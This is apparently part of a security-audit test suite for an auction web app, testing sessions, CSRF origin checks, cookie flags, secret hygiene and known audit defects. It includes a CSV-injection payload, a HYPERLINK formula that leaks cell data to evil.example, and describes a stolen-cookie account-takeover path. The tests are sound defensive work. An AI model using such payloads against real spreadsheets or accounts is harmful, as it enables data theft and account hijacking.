    monkeypatch.setattr(api, "_now", lambda: real + accounts.SESSION_TTL_SECONDS + 10)
    assert w["alice"].get(f"/api/auction/rooms/{room}/view").status_code == 401


def test_logout_kills_the_session_server_side(env):  # noqa: F811
    w = _world(env)
    room = w["room"]
    stolen = w["alice"].cookies.get(api.COOKIE_NAME)
    assert w["alice"].post("/api/auction/auth/logout", json={}, headers=ORIGIN).status_code == 200
    replay = TestClient(w["app"])
    replay.cookies.set(api.COOKIE_NAME, stolen)
    assert replay.get(f"/api/auction/rooms/{room}/view").status_code == 401


# ---------------------------------------------------------------------------
# 6. Account switching on one browser / push subscriptions
# ---------------------------------------------------------------------------


def _register(client, n=1):
    r = client.post(
        "/api/auction/notify/devices",
        json={"subscription": {"endpoint": f"{FCM}device-{n}", "keys": KEYS}, "label": "phone"},
        headers=ORIGIN,
    )
    assert r.status_code == 200, r.text
    return r.json()["deviceId"]


def _live_ids(st, uid):
    with st.read() as conn:
        return {d["id"] for d in notify._live_devices(conn, uid, time.time())}


def test_logout_then_login_as_someone_else_carries_nothing_over(env):  # noqa: F811
    w = _world(env)
    st, room = w["st"], w["room"]
    phone = w["alice"]
    dev = _register(phone)
    assert dev in _live_ids(st, w["ids"]["alice"])
    assert phone.post("/api/auction/auth/logout", json={}, headers=ORIGIN).status_code == 200
    r = phone.post(
        "/api/auction/auth/login", json={"handle": "bob", "password": PW["bob"]}, headers=ORIGIN
    )
    assert r.status_code == 200
    v = phone.get(f"/api/auction/rooms/{room}/view").json()
    assert v["me"]["seat"] == "S3" and not _paths_with(v, SECRET_MAX)
    assert dev not in _live_ids(st, w["ids"]["alice"])
    # bob re-binding the same physical subscription moves it to bob
    assert _register(phone) == dev
    assert dev in _live_ids(st, w["ids"]["bob"]) and dev not in _live_ids(st, w["ids"]["alice"])


@pytest.mark.xfail(
    strict=True,
    reason=(
        "AUDIT DEFECT (LOW-MEDIUM): /auth/login (also /auth/reset, /invites/claim for a new "
        "account, /auth/site-owner) issues a new cookie without revoking the session in the "
        "cookie it replaces. The previous account's session stays live server-side, so its "
        "push device stays live and that account's alerts keep going to the browser the new "
        "account is using until the client happens to call refreshBinding(). Fix: in "
        "api.auth_login/auth_reset/invite_claim/auth_site_owner, revoke the presented "
        "COOKIE_NAME session and notify.disable_devices_for_session() before _set_cookie()."
    ),
)
def test_switching_accounts_without_logout_does_not_keep_the_old_push_binding(env):  # noqa: F811
    w = _world(env)
    st = w["st"]
    phone = w["alice"]
    dev = _register(phone)
    r = phone.post(
        "/api/auction/auth/login", json={"handle": "bob", "password": PW["bob"]}, headers=ORIGIN
    )
    assert r.status_code == 200
    assert dev not in _live_ids(st, w["ids"]["alice"])


def test_device_endpoints_are_scoped_to_the_signed_in_account(env):  # noqa: F811
    w = _world(env)
    st = w["st"]
    alice_dev = _register(w["alice"], n=7)
    # bob cannot disable, test-send to, or confirm alice's device / outbox
    r = w["bob"].post(
        "/api/auction/notify/devices/disable", json={"deviceId": alice_dev}, headers=ORIGIN
    )
    assert r.json()["disabled"] == 0
    r = w["bob"].post(
        "/api/auction/notify/devices/disable",
        json={"endpoint": f"{FCM}device-7"},
        headers=ORIGIN,
    )
    assert r.json()["disabled"] == 0
    assert alice_dev in _live_ids(st, w["ids"]["alice"])
    r = w["bob"].post("/api/auction/notify/test", json={"deviceId": alice_dev}, headers=ORIGIN)
    assert r.status_code == 409
    oid = (
        w["alice"]
        .post("/api/auction/notify/test", json={"deviceId": alice_dev}, headers=ORIGIN)
        .json()["outboxIds"][0]
    )
    r = w["bob"].post(
        "/api/auction/notify/test/confirm", json={"outboxId": oid, "seen": True}, headers=ORIGIN
    )
    assert r.status_code == 404
    # bob's notify state lists only his own devices, and never an endpoint
    state = w["bob"].get("/api/auction/notify/state").json()
    assert state["devices"] == [] and "endpoint" not in _keys(state)
    # marking alice's inbox rows read from bob's session changes nothing
    ids = [i["id"] for i in w["alice"].get("/api/auction/notify/inbox").json()["items"]]
    assert ids
    w["bob"].post("/api/auction/notify/inbox/read", json={"ids": ids, "all": True}, headers=ORIGIN)
    after = w["alice"].get("/api/auction/notify/inbox").json()
    assert after["unread"] == len(ids)


def test_seat_notifications_follow_the_seat_not_the_old_person(env):  # noqa: F811
    w = _world(env)
    st, app, room, owner = w["st"], w["app"], w["room"], w["owner"]
    _register(w["alice"], n=3)
    owner.post(
        f"/api/auction/rooms/{room}/members/{w['ids']['alice']}/remove",
        json={"reason": "lost account"},
        headers=ORIGIN,
    )
    dave, dave_id = _join(app, owner, room, "S2", "dave")
    # bob outbids S2 → the alert goes to dave (current holder), never alice
    assert _cmd(w["bob"], room, {"kind": "bid", "auction": w["aid"], "max": 95}).status_code == 200
    with st.read() as conn:
        rows = conn.execute(
            "SELECT user_id FROM notif_inbox WHERE room_id=? AND type='outbid' AND seat_id='S2'",
            (room,),
        ).fetchall()
        alice_outbox = conn.execute(
            "SELECT COUNT(*) FROM notif_outbox WHERE user_id=? AND status='pending'",
            (w["ids"]["alice"],),
        ).fetchone()[0]
    assert {r["user_id"] for r in rows} == {dave_id}
    assert alice_outbox == 0


# ---------------------------------------------------------------------------
# 7. Advice context — the caller's OWN seat only
# ---------------------------------------------------------------------------


def test_advice_context_is_always_the_callers_own_seat(env, fake_roster_context):  # noqa: F811
    w = _world(env)
    room = w["room"]
    q = "?seat=S2&seatId=S2&ownerId=u2&owner_id=u2&teamName=Team%202&rosterId=2"
    got = {}
    for who in ("owner", "alice", "bob", "obs"):
        got[who] = w[who].get(f"/api/auction/rooms/{room}/advice-context{q}").json()
    assert got["alice"]["context"]["ownerEcho"] == "u2"
    assert got["bob"]["context"]["ownerEcho"] == "u3"
    assert got["owner"]["context"]["ownerEcho"] == "u1"
    assert got["obs"]["reason"] == "no_seat" and got["obs"]["context"] is None
    assert fake_roster_context == ["u1", "u2", "u3"]


# ---------------------------------------------------------------------------
# 8. Mock vs official
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "room_type", ["official", "OFFICIAL", " official", "Official", "live", "", "null"]
)
def test_only_mock_rooms_can_be_created(env, room_type):  # noqa: F811
    st, app = env
    owner = _owner_client(app)
    r = owner.post(
        "/api/auction/rooms",
        json={"roomType": room_type, "budgetSource": "equal", "seatSource": "generic"},
        headers=ORIGIN,
    )
    if room_type == "":
        # empty falls back to the default, which is mock
        assert r.status_code == 200
        state, _, _ = st.load(r.json()["roomId"])
        assert state["room_type"] == "mock"
    else:
        assert r.status_code == 403 and r.json()["error"] == "official_launch_gated"


def test_room_type_cannot_be_smuggled_into_a_mock(env):  # noqa: F811
    st, app = env
    owner = _owner_client(app)
    room = _make_room(owner, budgetSource="equal", equalAmount=100, room_type="official")["roomId"]
    assert st.load(room)[0]["room_type"] == "mock"
    r = _cmd(owner, room, {"kind": "configure", "rules": {"room_type": "official"}})
    assert r.status_code == 400
    r = _cmd(owner, room, {"kind": "set_seat", "seat": "S2", "patch": {"room_type": "official"}})
    assert r.status_code == 409
    with st.read() as conn:
        assert (
            conn.execute("SELECT room_type FROM rooms WHERE id=?", (room,)).fetchone()[0] == "mock"
        )


def _official_room(st, owner_uid):
    rules = default_rules("official")
    seats = [
        {"id": f"S{i + 1}", "name": f"Team {i + 1}", "opening_budget": 100, "is_bot": False}
        for i in range(rules["seat_count"])
    ]
    state = engine.new_room_state(
        room_id="r_official01",
        name="Official",
        room_type="official",
        rules=rules,
        seats=seats,
        order=None,
        pool=make_pool(),
        created_at=time.time(),
    )
    st.create_room(state, created_by=owner_uid, now_real=time.time())
    with st.write() as conn:
        accounts.add_member(
            st,
            conn,
            room_id="r_official01",
            user_id=owner_uid,
            role="commissioner",
            seat_id="S1",
            now=time.time(),
        )
    return "r_official01"


def test_mock_identities_and_tools_do_not_reach_an_official_room(env):  # noqa: F811
    st, app = env
    owner = _owner_client(app)
    owner_uid = owner.get("/api/auction/auth/me").json()["user"]["id"]
    mock = _ready_room(owner)
    alice, _ = _join(app, owner, mock, "S2", "alice")
    official = _official_room(st, owner_uid)
    # a mock member's session is not membership of the official room
    assert alice.get(f"/api/auction/rooms/{official}/view").status_code == 403
    assert _cmd(alice, official, {"kind": "nominate", "player": "P1"}).status_code == 403
    # a mock invite token is bound to its mock room
    token = _invite(owner, mock, seat="S4")
    peek = TestClient(app).get(f"/api/auction/invites/peek?token={token}").json()
    assert peek["roomId"] == mock and peek["roomType"] == "mock"
    c, r = _claim(app, token, "erin")
    assert r.status_code == 200
    assert c.get(f"/api/auction/rooms/{official}/view").status_code == 403
    # mock-only tools refuse the official room even for its commissioner
    r = owner.post(
        f"/api/auction/rooms/{official}/clock", json={"advanceSeconds": 60}, headers=ORIGIN
    )
    assert r.status_code == 403
    # a clone is always a NEW MOCK; the source room is never promoted or touched
    before = st.load(official)
    r = owner.post(f"/api/auction/rooms/{official}/clone", json={}, headers=ORIGIN)
    assert r.status_code == 200
    assert st.load(r.json()["roomId"])[0]["room_type"] == "mock"
    assert st.load(official) == before
    r = owner.post(f"/api/auction/rooms/{mock}/clone", json={}, headers=ORIGIN)
    assert st.load(r.json()["roomId"])[0]["room_type"] == "mock"
    assert st.load(mock)[0]["room_type"] == "mock"


# ---------------------------------------------------------------------------
# 9. CSRF / idempotency / cookies / secrets
# ---------------------------------------------------------------------------


def _mutations(room, uid):
    return [
        ("/api/auction/auth/login", {"handle": "alice", "password": PW["alice"]}),
        ("/api/auction/auth/logout", {}),
        ("/api/auction/auth/password", {"current": PW["alice"], "password": "x" * 12}),
        ("/api/auction/auth/reset", {"token": "t", "password": "x" * 12}),
        ("/api/auction/invites/claim", {"token": "t"}),
        ("/api/auction/rooms", {}),
        (f"/api/auction/rooms/{room}/commands", {"kind": "withdraw", "auction": "A1"}),
        (f"/api/auction/rooms/{room}/invites", {"seat": "S4"}),
        (f"/api/auction/rooms/{room}/clock", {"advanceSeconds": 60}),
        (f"/api/auction/rooms/{room}/clone", {}),
        (f"/api/auction/rooms/{room}/watch", {"auction": "A1"}),
        (f"/api/auction/rooms/{room}/members/{uid}/reset-link", {}),
        (f"/api/auction/rooms/{room}/members/{uid}/remove", {"reason": "x"}),
        ("/api/auction/notify/devices", {"subscription": {}}),
        ("/api/auction/notify/devices/disable", {"deviceId": 1}),
        ("/api/auction/notify/prefs", {"prefs": {}}),
        ("/api/auction/notify/test", {}),
        ("/api/auction/notify/test/confirm", {"outboxId": 1}),
        ("/api/auction/notify/inbox/read", {"all": True}),
        ("/api/auction/notify/email", {"email": "a@b.co"}),
        ("/api/auction/notify/email/verify", {"token": "t"}),
        ("/api/auction/auth/site-owner", {}),
    ]


@pytest.mark.parametrize(
    "origin", [None, "https://evil.example", "null", "http://testserver.evil.example"]
)
def test_every_mutation_refuses_a_missing_or_foreign_origin(env, origin):  # noqa: F811
    w = _world(env)
    st, room = w["st"], w["room"]
    before = st.load(room)
    headers = {"Idempotency-Key": "csrf-attempt-01"}
    if origin is not None:
        headers["Origin"] = origin
    for client in (w["owner"], w["alice"]):
        for url, body in _mutations(room, w["ids"]["bob"]):
            r = client.post(url, json=body, headers=headers)
            assert r.status_code == 403 and r.json()["error"] == "bad_origin", (url, r.text)
    assert st.load(room) == before
    assert w["alice"].get(f"/api/auction/rooms/{room}/view").status_code == 200  # not logged out


def test_commands_require_a_well_formed_idempotency_key(env):  # noqa: F811
    w = _world(env)
    st, room = w["st"], w["room"]
    before = st.load(room)
    url = f"/api/auction/rooms/{room}/commands"
    body = {"kind": "bid", "auction": w["aid"], "max": 50}
    for key in (None, "", "short", "has space in it", "x" * 101, "semi;colon;key"):
        headers = dict(ORIGIN)
        if key is not None:
            headers["Idempotency-Key"] = key
        r = w["bob"].post(url, json=body, headers=headers)
        assert r.status_code == 400 and r.json()["error"] == "idempotency_key_required", key
    assert st.load(room) == before


_NON_COMMAND_MUTATIONS = [
    ("invites", {"seat": "S4"}),
    ("clock", {"advanceSeconds": 60}),
    ("clone", {}),
    ("remove", {"reason": "x"}),
]


@pytest.mark.xfail(
    strict=True,
    reason=(
        "AUDIT DEFECT (LOW, doc/code mismatch): ROOKIE_AUCTION_ROOM.md §3 says 'Every mutation "
        "requires ... an Idempotency-Key', but only POST /rooms/{id}/commands enforces it. "
        "Room creation, invites, mock clock, clone, member removal/reset-link and notify/* "
        "mutate without one, and a retried /clock advances the mock clock twice / a retried "
        "/clone makes two rooms. Fix: enforce in api._mutation_guard (with a receipt table) or "
        "narrow the §3 claim to room commands."
    ),
)
@pytest.mark.parametrize("path,body", _NON_COMMAND_MUTATIONS)
def test_every_mutation_requires_an_idempotency_key(env, path, body):  # noqa: F811
    w = _world(env)
    room, owner = w["room"], w["owner"]
    if path == "remove":
        url = f"/api/auction/rooms/{room}/members/{w['ids']['bob']}/remove"
    else:
        url = f"/api/auction/rooms/{room}/{path}"
    r = owner.post(url, json=body, headers=ORIGIN)  # Origin OK, no Idempotency-Key
    assert r.status_code == 400


def _set_cookie_headers(resp):
    return [v for k, v in resp.headers.multi_items() if k.lower() == "set-cookie"]


def test_session_cookie_flags_on_every_issuing_route(env, monkeypatch):  # noqa: F811
    st, app = env
    monkeypatch.delenv("JASON_AUTH_COOKIE_SECURE", raising=False)  # production default
    owner = TestClient(app)
    owner.cookies.set("jason_session", "site-admin")
    responses = [owner.post("/api/auction/auth/site-owner", headers=ORIGIN)]
    # re-attach the (Secure) cookie manually since TestClient speaks http
    tok = (
        responses[0].cookies.get(api.COOKIE_NAME)
        or (_set_cookie_headers(responses[0])[0].split(";")[0].split("=", 1)[1])
    )
    owner.cookies.set(api.COOKIE_NAME, tok)
    room = _ready_room(owner)
    token = _invite(owner, room, seat="S2")
    c = TestClient(app)
    responses.append(
        c.post(
            "/api/auction/invites/claim",
            json={"token": token, "handle": "alice", "password": PW["alice"]},
            headers=ORIGIN,
        )
    )
    responses.append(
        TestClient(app).post(
            "/api/auction/auth/login",
            json={"handle": "alice", "password": PW["alice"]},
            headers=ORIGIN,
        )
    )
    uid = responses[1].json()["user"]["id"]
    reset = _reset_token(owner, room, uid)
    responses.append(
        TestClient(app).post(
            "/api/auction/auth/reset",
            json={"token": reset, "password": "fresh-password-9"},
            headers=ORIGIN,
        )
    )
    for resp in responses:
        assert resp.status_code == 200, resp.text
        cookies = [h for h in _set_cookie_headers(resp) if h.startswith(api.COOKIE_NAME + "=")]
        assert len(cookies) == 1, cookies
        flags = {p.strip().lower() for p in cookies[0].split(";")[1:]}
        assert "httponly" in flags and "secure" in flags and "samesite=strict" in flags, flags
        assert "path=/" in flags
        value = cookies[0].split(";")[0].split("=", 1)[1]
        assert len(value) >= 40  # 256-bit token
        assert value not in resp.text  # never echoed in a body
    # only a hash is stored
    with st.read() as conn:
        hashes = {r[0] for r in conn.execute("SELECT token_hash FROM sessions")}
    assert tok not in hashes and accounts._token_hash(tok) in hashes


def test_no_password_or_token_is_ever_logged_stored_plain_or_returned(env, caplog):  # noqa: F811
    caplog.set_level(logging.DEBUG)
    w = _world(env)
    st, room, owner = w["st"], w["room"], w["owner"]
    token = _reset_token(owner, room, w["ids"]["bob"])
    new_pw = "brand-new-bob-pw-4"
    r = TestClient(w["app"]).post(
        "/api/auction/auth/reset", json={"token": token, "password": new_pw}, headers=ORIGIN
    )
    assert r.status_code == 200
    r = w["alice"].post(
        "/api/auction/auth/password",
        json={"current": PW["alice"], "password": "alice-second-pw-5"},
        headers=ORIGIN,
    )
    assert r.status_code == 200 and r.json() == {"ok": True}
    secrets_ = [*PW.values(), new_pw, "alice-second-pw-5", token]
    logged = "\n".join(rec.getMessage() for rec in caplog.records)
    for s in secrets_:
        assert s not in logged
    with st.read() as conn:
        dump = "\n".join(
            json.dumps([tuple(r) for r in conn.execute(f"SELECT * FROM {t}")], default=str)
            for t in ("users", "audit", "commands", "events", "idempotency", "password_resets")
        )
    for s in secrets_:
        assert s not in dump
    # every read surface a commissioner has: no password hash, no token hash
    for url in _read_routes(room, commissioner=True):
        body = owner.get(url).text
        assert "scrypt$" not in body and "token_hash" not in body and "pw_hash" not in body


def test_password_change_requires_the_current_password_and_revokes_other_sessions(env):  # noqa: F811
    w = _world(env)
    app, room = w["app"], w["room"]
    other = TestClient(app)
    other.post(
        "/api/auction/auth/login", json={"handle": "alice", "password": PW["alice"]}, headers=ORIGIN
    )
    # a stolen session alone cannot rotate the password (persistence)
    r = w["alice"].post(
        "/api/auction/auth/password",
        json={"current": "wrong-guess-123", "password": "attacker-pw-123"},
        headers=ORIGIN,
    )
    assert r.status_code == 403
    r = w["alice"].post(
        "/api/auction/auth/password",
        json={"current": PW["alice"], "password": "rotated-pw-1234"},
        headers=ORIGIN,
    )
    assert r.status_code == 200
    assert other.get(f"/api/auction/rooms/{room}/view").status_code == 401
    assert w["alice"].get(f"/api/auction/rooms/{room}/view").status_code == 200


@pytest.mark.xfail(
    strict=True,
    reason=(
        "AUDIT DEFECT (MEDIUM): the site-owner bridge account is documented as password-less "
        "('this account signs in only through the site owner's session', accounts."
        "get_or_create_site_owner; issue_reset refuses it), but accounts.change_password skips "
        "the current-password check when pw_hash is NULL. Anyone holding the owner's 30-day "
        "auction cookie can set a password with no proof and gain a permanent handle+password "
        "login to the commissioner/site-admin account that bypasses the site's auth gate (and "
        "survives later removal from PRIVATE_APP_ALLOWED_USERNAMES). Fix: refuse /auth/password "
        "for site_username accounts (409 'site_account'), mirroring recovery.issue_reset."
    ),
)
def test_site_owner_account_cannot_be_given_a_password_without_proof(env):  # noqa: F811
    st, app = env
    owner = _owner_client(app)
    r = owner.post(
        "/api/auction/auth/password",
        json={"current": "", "password": "stolen-cookie-pw-1"},
        headers=ORIGIN,
    )
    assert r.status_code in (403, 409)
    r = TestClient(app).post(
        "/api/auction/auth/login",
        json={"handle": "owner", "password": "stolen-cookie-pw-1"},
        headers=ORIGIN,
    )
    assert r.status_code == 401


def test_site_owner_bridge_requires_a_real_site_admin_session(env):  # noqa: F811
    st, app = env
    for cookie in (None, "guest", "forged"):
        c = TestClient(app)
        if cookie:
            c.cookies.set("jason_session", cookie)
        r = c.post("/api/auction/auth/site-owner", headers=ORIGIN)
        assert r.status_code == 403
    # an ordinary auction account is never a site admin
    owner = _owner_client(app)
    room = _ready_room(owner)
    alice, _ = _join(app, owner, room, "S2", "alice")
    me = alice.get("/api/auction/auth/me").json()
    assert me["user"]["isSiteAdmin"] is False
    assert [r["id"] for r in me["rooms"]] == [room]


# ---------------------------------------------------------------------------
# 10. Export hygiene (found while sweeping export routes)
# ---------------------------------------------------------------------------


@pytest.mark.xfail(
    strict=True,
    reason=(
        "AUDIT DEFECT (LOW): CSV export writes seat/team/player names verbatim. Seat names come "
        "from league members' own Sleeper display names, so a manager named '=HYPERLINK(...)' "
        "becomes a live formula when the commissioner opens auction-<room>-results.csv in "
        "Excel/Sheets (CSV injection). Fix: in api.room_export prefix cells starting with "
        "= + - @ TAB CR with a single quote."
    ),
)
def test_csv_export_neutralises_spreadsheet_formulas(env):  # noqa: F811
    st, app = env
    evil = '=HYPERLINK("https://evil.example/?x="&A1,"click")'
    sys.modules["server"].latest_contract_data["sleeper"]["teams"][0]["name"] = evil
    owner = _owner_client(app)
    room = _ready_room(owner)
    _cmd(owner, room, {"kind": "nominate", "player": "991"})
    owner.post(f"/api/auction/rooms/{room}/clock", json={"advanceSeconds": 3600}, headers=ORIGIN)
    text = owner.get(f"/api/auction/rooms/{room}/export?format=csv").text
    cells = [c for row in csv.reader(io.StringIO(text)) for c in row]
    assert evil in " ".join(cells) or any("HYPERLINK" in c for c in cells)
    assert not any(c[:1] in ("=", "+", "-", "@") for c in cells if c)
